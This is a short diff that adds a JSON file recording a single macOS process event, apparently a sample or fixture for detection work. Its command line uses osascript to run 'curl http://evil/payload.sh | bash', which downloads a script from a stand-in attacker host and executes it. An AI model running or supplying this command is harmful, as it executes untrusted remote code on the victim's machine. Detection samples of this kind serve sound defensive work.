@@ -1,0 +1,4 @@
+{
+  "process": "osascript",
+  "command_line": "osascript -e 'do shell script \"curl http://evil/payload.sh | bash\"'"
+}
